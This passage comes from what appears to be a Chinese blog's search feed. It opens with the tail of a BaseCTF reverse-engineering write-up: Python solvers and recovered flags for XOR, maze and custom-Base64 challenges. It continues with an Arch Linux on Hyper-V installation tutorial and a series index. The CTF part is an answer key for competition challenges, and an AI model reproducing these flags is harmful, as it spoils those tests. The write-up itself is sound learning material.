class="hljs-title function_">Interesting</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">105</span>);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">100</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">putchar</span>(<span class="hljs-number">52</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;BaseCTF&#123;&#123;&#123;&#125;&#125;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&quot;Y0u_4Re_&quot;</span> + <span class="hljs-built_in">bytes</span>([<span class="hljs-number">57</span>, <span class="hljs-number">48</span>, <span class="hljs-number">48</span>, <span class="hljs-number">100</span>, <span class="hljs-number">95</span>, <span class="hljs-number">52</span>, <span class="hljs-number">55</span>, <span class="hljs-number">95</span>, <span class="hljs-number">105</span>, <span class="hljs-number">100</span>, <span class="hljs-number">52</span>]).decode()))<br></code></pre></td></tr></table></figure><h3 id="upx-mini">UPX mini</h3><p>直接运行？忘了</p><h3 id="ez-xor">Ez Xor</h3><p>一开始没怎么看懂密钥是怎么生成的，动态调试了一下直接拿到密钥，再与数据对比分析一下才看懂，其实是数据的大小端问题。<code>0x726F58i32</code>从小端开始那么是<code>[0x58, 0x6F, 0x72, 0x00]</code>，但是从大端开始就说不通了。想通这一点下面就都解决了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> struct<br><br>iv = struct.pack(<span class="hljs-string">&quot;&lt;i&quot;</span>, <span class="hljs-number">0x726F58</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>([c^k <span class="hljs-keyword">for</span> c, k <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(<br>    itertools.chain(<br>        struct.pack(<span class="hljs-string">&quot;&lt;Q&quot;</span>, <span class="hljs-number">0x1D0B2D2625050901</span>),<br>        struct.pack(<span class="hljs-string">&quot;&lt;Q&quot;</span>, <span class="hljs-number">0x673D491E20317A24</span>),<br>        struct.pack(<span class="hljs-string">&quot;&lt;Q&quot;</span>, <span class="hljs-number">0x34056E2E2508504D</span>),<br>        <span class="hljs-string">b&#x27;&quot;@;%&#x27;</span>,<br>    ),<br>    <span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> i: i^iv[i%<span class="hljs-number">3</span>], <span class="hljs-built_in">reversed</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">28</span>))),<br>)]).decode())<br></code></pre></td></tr></table></figure><h3 id="ez_maze">ez_maze</h3><p>走迷宫那么必然有迷宫，Shift+F12 看到一堆 <code>$</code> 和<code>&amp;</code>。数一下是225个，猜想15*15的迷宫，手动换行。看起来<code>&amp;</code> 像是路，手动替换。走路并手动走路。</p><p>验证一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br>maze = <span class="hljs-string">&quot;x$$$$$$$$$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;$$$$$$$$$&amp;$&amp;$$&amp;$$&amp;&amp;&amp;&amp;&amp;$$&amp;$&amp;$$$&amp;&amp;$$$$&amp;$$&amp;$$$&amp;&amp;&amp;$$$$$&amp;$$&amp;$$$&amp;$&amp;&amp;$&amp;$$$$$&amp;$$$&amp;$&amp;$$&amp;&amp;&amp;$$$&amp;&amp;&amp;&amp;&amp;$&amp;&amp;&amp;&amp;$&amp;$$$$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;$$$$$$$$$&amp;$$$$$$$$$$$&amp;&amp;&amp;&amp;$$&amp;&amp;&amp;$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;&amp;$$$$$$$$$$$$$$&amp;$$&amp;$$$$$$$$$$$&amp;$&amp;$$$$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;y&quot;</span><br>pos = <span class="hljs-number">0</span><br><br>steps = <span class="hljs-string">&quot;sssssssddddwwwddsssssssdddsssddddd&quot;</span><br><span class="hljs-keyword">for</span> step <span class="hljs-keyword">in</span> steps:<br>    <span class="hljs-keyword">match</span> <span class="hljs-built_in">ord</span>(step):<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">100</span>:<br>            <span class="hljs-keyword">if</span> pos%<span class="hljs-number">15</span> == <span class="hljs-number">14</span>:<br>                exit(<span class="hljs-number">1</span>)<br>            pos += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">115</span>:<br>            <span class="hljs-keyword">if</span> pos &gt; <span class="hljs-number">209</span>:<br>                exit(<span class="hljs-number">1</span>)<br>            pos += <span class="hljs-number">15</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">119</span>:<br>            <span class="hljs-keyword">if</span> pos &lt;= <span class="hljs-number">14</span>:<br>                exit(<span class="hljs-number">1</span>)<br>            pos -= <span class="hljs-number">15</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">97</span>:<br>            <span class="hljs-keyword">if</span> pos%<span class="hljs-number">15</span> == <span class="hljs-number">0</span>:<br>                exit(<span class="hljs-number">1</span>)<br>            pos -= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">case</span> _:<br>            <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(maze[pos]) == <span class="hljs-number">36</span>:<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">ord</span>(maze[pos]) == <span class="hljs-number">121</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;BaseCTF&#123;&#123;&#123;&#125;&#125;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(hashlib.md5(steps.encode()).hexdigest()))<br></code></pre></td></tr></table></figure><h3 id="baseplus">BasePlus</h3><p>其实也是没有完全看懂代码，但是看到了编码的其中一段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">v17[<span class="hljs-number">0</span>] = Secret[(<span class="hljs-type">unsigned</span> __int8)v15 &gt;&gt; <span class="hljs-number">2</span>];<br>v17[<span class="hljs-number">1</span>] = Secret[(HIBYTE(v15) &gt;&gt; <span class="hljs-number">4</span>) | (<span class="hljs-number">16</span> * (_BYTE)v15) &amp; <span class="hljs-number">0x30</span>];<br>v17[<span class="hljs-number">2</span>] = Secret[(v16 &gt;&gt; <span class="hljs-number">6</span>) | (<span class="hljs-number">4</span> * HIBYTE(v15)) &amp; <span class="hljs-number">0x3C</span>];<br>v17[<span class="hljs-number">3</span>] = Secret[v16 &amp; <span class="hljs-number">0x3F</span>];<br></code></pre></td></tr></table></figure><p>因为前段时间无聊，手写了一次Base64编码，对这段位运算有点眼熟，然后看看 Secret，好像是自定义 Base64编码集合。CyberChef试一下发现居然是有名有姓的，叫什么Atom128。但是解码不对，看起来与原始信息差了一些，继续看代码发现还有异或，再试一下就<ahref="https://gchq.github.io/CyberChef/#recipe=XOR(%7B&#39;option&#39;:&#39;Hex&#39;,&#39;string&#39;:&#39;E&#39;%7D,&#39;Standard&#39;,false)From_Base64(&#39;/128GhIoPQROSTeUbADfgHijKLM%2Bn0pFWXY456xyzB7%3D39VaqrstJklmNuZvwcdEC&#39;,true,false)&amp;input=bHZmekJpWmlPdzc8bGhGOGRET2ZFYm1JXWlAYmRjWmZFY156PmFEIQ">解出来了</a>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">*(_BYTE *)(dst + v8) = v4[v8] ^ <span class="hljs-number">0xE</span>;<br></code></pre></td></tr></table></figure><h2 id="结尾">结尾</h2><p>补题！做毕设！</p>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
      <category>竞赛</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>在 Hyper-V 中安装 Archlinux（上）</title>
    <link href="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/"/>
    <url>/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/</url>
    
    <content type="html"><![CDATA[<p>这既是一篇 Hyper-V 安装虚拟机的教程，也是一篇安装 Archlinux的教程。</p><span id="more"></span><p>Archlinux 向来以“难安装”著称，一直以来是我心头的白月光。曾经用 <ahref="https://github.com/arch-linux-gui">Arch Liunx GUI</a>安装过一次并且用了很久，但是从命令行安装还真的没有完整尝试过，加之Archlinux 在官方网站上提供了<ahref="https://wiki.archlinuxcn.org/wiki/%E5%AE%89%E8%A3%85%E6%8C%87%E5%8D%97">安装指南</a>，所以再一次尝试一下Archlinux 的安装。</p><p>先去搞一个 <ahref="https://mirrors.tuna.tsinghua.edu.cn/archlinux/iso/latest/">Archlinux镜像</a></p><h2 id="创建与配置虚拟机">创建与配置虚拟机</h2><h3 id="hyper-v-管理器概览">Hyper-V 管理器概览</h3><p>打开 <strong>Hyper-V 管理器</strong>，界面如图1-1所示</p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig1-1.png" class="" title="Hyper-V 管理器界面"><p>可以看到界面除了菜单栏外主要分为左中右三栏</p><ul><li>左栏为 Hyper-V 管理服务器列表，可以添加远程管理器。图中只有本地Hyper-V 管理器。</li><li>中栏为当前管理器下管理的虚拟机，虚拟机的检查点（快照），虚拟机的详细信息等三行消息。图中可以看到已经有两个虚拟机<code>i3wm-demo</code> 和 <code>mininet</code>了（它们会在后面的文章中出现）。</li><li>右栏为操作栏，对选定的虚拟机可以执行相应的操作。</li></ul><p>话不多说，我们开始吧。</p><h3 id="创建虚拟机">创建虚拟机</h3><ol type="1"><li><p>在右栏中选择“新建→虚拟机→下一步”设置虚拟机名称和储存的位置，勾选“将虚拟机存储在其他位置”后可以选择一个C盘以外的位置（建议勾选，别把C盘撑爆）。如图1-2-1所示。</p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig1-2-1.png" class="" title="指定名称和位置"></p></li><li><p>点击下一步，选择虚拟机版本，1代 Hyper-V虚拟机显然是没二代好呀，选二代。如图1-2-2所示</p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig1-2-2.png" class="" title="选择虚拟机版本"></p></li><li><p>点击下一步，设置虚拟机内存大小，这里我设置了6GB也就是6144MB内存。如图1-2-3所示</p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig1-2-3.png" class="" title="分配内存"></p></li><li><p>点击下一步，设置虚拟机的网络。默认设置中，虚拟机存在一个网卡，在后面的设置中可以添加网卡。默认设置中只有<code>Default Switch</code>一个交换机，所以就连接到它。如图1-2-4所示</p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig1-2-4.png" class="" title="连接网卡"></p><blockquote><p>在后续的实验中，我们会创建新的交换机以及新的网卡来满足隔离、组网等需求。</p></blockquote></li><li><p>点击下一步，创建虚拟磁盘，该磁盘就是虚拟机的磁盘了。默认名称和位置就好，改一下大小为32G，因为就是做实验嘛这么大够了，要是电脑存储不够，8G也能对付，再少就不太好了。如图1-2-5所示</p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig1-2-5.png" class="" title="创建虚拟磁盘"></p></li><li><p>点击下一步，选择安装介质，这里就选择我们刚刚下载的 Archlinux镜像。如图1-2-6所示。</p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig1-2-6.png" class="" title="选择安装介质"></p></li></ol><p>最后，点击“下一步→完成”即可完成虚拟创建。</p><h3 id="设置虚拟机">设置虚拟机</h3><p>你先别急，这里还需要几步配置才能启动虚拟机，不然后面有你急的</p><ol type="1"><li><p>中栏选中新创建的虚拟机<code>archlinux-demo</code>，在右栏中选择设置，选择“安全”，取消“启用安全启动”的勾选，点击右下角“应用”保存设置。如图1-3所示</p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig1-3.png" class="" title="禁用安全启动"></p><blockquote><p>这是安装 Linux 系统需要的操作，至于安装 Windows 和 MacOS，以及启动Linux系统是否可以打开，大家可以尝试一下</p></blockquote></li></ol><h2 id="安装-archlinux">安装 Archlinux</h2><p>Archlinux，启动！（并连接）</p><p>Archlinux 安装的过程在<ahref="https://wiki.archlinuxcn.org/wiki/%E5%AE%89%E8%A3%85%E6%8C%87%E5%8D%97">安装指南</a>及其附带的链接中有详细的叙述，但是文章过于冗长。本文着重记录其中的关键步骤，关键步骤按顺序包括：</p><ol type="1"><li>连接互联网并更新系统时间</li><li>创建并格式化硬盘分区</li><li>设置镜像并安装系统</li><li>配置系统</li></ol><h3 id="连接互联网并配置时间">连接互联网并配置时间</h3><p>与 Ubuntu、Debian 的安装介质不同，Archlinux 安装光盘并不包含 Linux系统的相关组件，所以需要从互联网下载，那么连接互联网是安装系统的基础。</p><p>在物理机上连接互联网有时候并不是一件很轻松的事情，特别是当互联网服务需要Web认证的时候（校园网：报我身份证号得了）。然而在虚拟机中倒是相当简单，Hyper-V的默认交换机提供了 NAT 功能，只需要虚拟机通过 DHCP 获取 IP即可连接到互联网。而 Archlinux 安装系统在启动过程中就启动了 DHCP服务器，所以一切都不用配置。如果不放心，可以使用 <code>ip link</code>查看网卡的 IP 地址情况，以及使用 <code>ping bing.com</code>确认是否真的能联网。</p><p>联网后应当使用 NTP服务同步时间，因为一些镜像站在本地时间（虚拟机的时间）与系统时间（镜像站的时间）差别过大的时候，无法同步消息。命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">timedatectl<br></code></pre></td></tr></table></figure><p>运行结果如图2-1所示：</p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig2-1.png" class="" title="同步时间"><h3 id="创建并格式化硬盘分区">创建并格式化硬盘分区</h3><p>这是 Archlinux甚至所有操作系统不可或缺的一步。主要分为：寻找可用设备、划分分区、格式化分区三步。</p><ol type="1"><li><p>寻找可用设备</p><p>要查找系统中可用的存储设备，使用 <code>fdisk -l</code>可以看到一些设备，其中结果中以 <code>rom</code>、<code>loop</code> 或者<code>airootfs</code> 结尾的设备可以被忽略。结果中以<code>rpbm</code>、<code>boot0</code> 或者 <code>boot1</code> 结尾的<code>mmcblk*</code> 设备也可以被忽略。一般情况下是以 <code>sd*</code>或者 <code>nvme*</code> 结尾。运行结果如图2-2-1所示：</p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig2-2-1.png" class="" title="寻找可用设备"></p></li><li><p>划分分区</p><p>其次，使用分区工具在磁盘的空余空间上划分分区。对于 Linux系统而言，至少需要：一个根分区，用于挂载根目录；对于 UEFI启动模式，一个EFI系统分区。此外，还可以设置磁盘阵列等功能，实现更多特性。然而本实验中并不需要这样多的特性，本文中规划了三个分区：</p><table><thead><tr class="header"><th>分区</th><th>挂载点</th><th>类型</th><th>分区大小</th></tr></thead><tbody><tr class="odd"><td><code>/dev/sda1</code></td><td><code>/boot</code></td><td>EFI系统分区</td><td>1G</td></tr><tr class="even"><td><code>/dev/sda2</code></td><td><code>/</code></td><td>Linux Root (x86_64)</td><td>16G</td></tr><tr class="odd"><td><code>/dev/sda3</code></td><td><code>/home</code></td><td>Linux文件系统</td><td>剩余空间</td></tr></tbody></table><p>使用 <code>cfdisk</code> 对磁盘执行分区（Linux Root(x86_64)也可以换成Linux文件系统），结果如图2-2-2所示：</p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig2-2-2.png" class="" title="划分分区界面"></p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig2-2-3.png" class="" title="划分分区结果"></p></li><li><p>格式化分区</p><p>最后，格式化各个分区，创建文件系统。文件系统是组织文件数据的方式，不同的文件系统有不同的特点。对于这里所分的三个分区，设置如下文件系统：</p><table><thead><tr class="header"><th>分区</th><th>文件系统</th><th>说明</th></tr></thead><tbody><tr class="odd"><td><code>/dev/sda1</code></td><td>fat32</td><td>EFI系统分区必须是fat32文件系统</td></tr><tr class="even"><td><code>/dev/sda2</code></td><td>ext4</td><td>Linux 默认文件系统，各方面属性很均匀</td></tr><tr class="odd"><td><code>/dev/sda3</code></td><td>ext4</td><td></td></tr></tbody></table><p>命令如下，运行结果如图2-2-4所示：</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkfs.ext4 /dev/sda2<br>mkfs.ext4 /dev/sda3<br>mkfs.fat -F 32 /dev/sda1<br></code></pre></td></tr></table></figure></p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig2-2-4.png" class="" title="格式化分区"></p></li></ol><h3 id="配置镜像并安装系统">配置镜像并安装系统</h3><p>前面说到 Archlinux 安装需要连接网络下载 Linux 相关的文件。而Archlinux提供的镜像远在海外，即使没有众所周知的原因，下载速度也会大打折扣，所以需要配置一下镜像。这里我使用了清华大学开源镜像站的Archlinux 镜像，<ahref="https://mirrors.tuna.tsinghua.edu.cn/help/archlinux/">点击</a>获取配置教程。</p><p>接着就该将 Archlinux安装到磁盘中了。在安装之前需要将安装系统的磁盘挂载到系统中，且一定要按照层级顺序挂载目录，否则会出现无法访问目录的情况。以下是挂载的命令:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">mount /dev/sda2 /mnt<br>mount --mkdir /dev/sda1 /mnt/boot<br>mount --mkdir /dev/sda3 /mnt/home<br></code></pre></td></tr></table></figure><p>接着就是安装系统。首先先更新软件库，接着更新密钥环（如果长时间不更新密钥环会导致过期证书无法更新，软件安装检查过不了），最后一键安装系统。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">pacman -Syy<br>pacman -Sy archlinux-keyring<br>pacstrap -K /mnt base linux grub efibootmgr neovim<br></code></pre></td></tr></table></figure><p>这里说明一下 <code>pacstrap</code> 安装的几个软件包：</p><ul><li><code>base</code> 是必须的</li><li><code>linux</code> 可以选择其<ahref="https://wiki.archlinuxcn.org/wiki/%E5%86%85%E6%A0%B8#%E5%AE%98%E6%96%B9%E6%94%AF%E6%8C%81%E7%9A%84%E5%86%85%E6%A0%B8">变种</a></li><li><code>grub</code> 和 <code>efibootmgr</code> 是为了安装和管理 GRUB启动器的包，后面会用到</li><li><code>neovim</code> 是为了防止没有趁手的编辑器。</li></ul><p>如果你还想要安装其它软件（AUR仓库的得到后面安装了），可以直接在后面添加就完事了。</p><h3 id="配置系统">配置系统</h3><p>系统已经安装完啦，下面我们应该来配置系统了。有两项工作要做，一是生成<code>fstab</code>，在后面的启动过程中如何挂载磁盘，二是配置 GRUB引导器来引导操作系统。</p><ol type="1"><li><p>生成 <code>fstab</code></p><p>命令如下，结果如图2-2-5所示</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">genfstab -U /mnt &gt;&gt; /mnt/etc/fstab<br></code></pre></td></tr></table></figure></p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig2-2-5.png" class="" title="生成 fstab"></p></li><li><p>配置 GRUB</p><p>首先切换到安装好的系统下面</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">arch-chroot /mnt<br></code></pre></td></tr></table></figure></p><p>然后，安装 GRUB 并生成配置</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=GRUB<br>grub-mkconfig -o /boot/grub/grub.cfg<br></code></pre></td></tr></table></figure></p></li></ol><h2 id="善后工作">善后工作</h2><p>至此，Archlinux 已经完整地安装在你的虚拟硬盘中了。用<code>exit</code> 退出安装好的 Archlinux 系统，再 <code>poweroff</code>关掉安装系统以关闭虚拟机。设置启动顺序，这里需要将 DVD驱动器删除，接着将 <code>grubx64.efi</code>移动到最上面，保存设置后就算完成啦。最终结果如图3-1所示</p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig3-1.png" class="" title="设置启动顺序"><p>下一篇主要介绍系统中桌面环境的安装及配置。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hyper-V 探险记录（目录）</title>
    <link href="/2024/07/18/hyper-v-adventure/content/"/>
    <url>/2024/07/18/hyper-v-adventure/content/</url>
    
    <content type="html"><![CDATA[<p>你说得对，但是 Hyper-V 是巨硬开发的一款本地虚拟机管理程序。</p><span id="more"></span><blockquote><p>许多虚拟化应用程序依赖于大多数新式处理器上可用的硬件虚拟化扩展。它包括Intel VT-x 和AMD-V。一次只能有一个软件组件使用此硬件。无法在虚拟化应用程序之间共享硬件。</p><footer><strong>Microsoft</strong><cite><a href="https://learn.microsoft.com/zh-cn/troubleshoot/windows-client/application-management/virtualization-apps-not-work-with-hyper-v#cause">virtualization-apps-not-work-with-hyper-v</a></cite></footer></blockquote><p>而形如 WSL、Docker 等应用都需要启用 Hyper-V技术。因此，一旦需要使用虚拟机相关的虚拟化软件，例如：VirtualBox等，就无法使用<strong>硬件虚拟化扩展</strong>技术。当前VirtualBox 等虚拟机软件会调用 Hyper-V 提供的虚拟化 API来实现软件虚拟化，但是性能会大打折扣。所以为了性能，不得不向 Hyper-V低头。</p><p>本系列记录了在探索 Hyper-V 过程中的一些值得记录的内容，不定期更新</p>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
      <category>目录</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
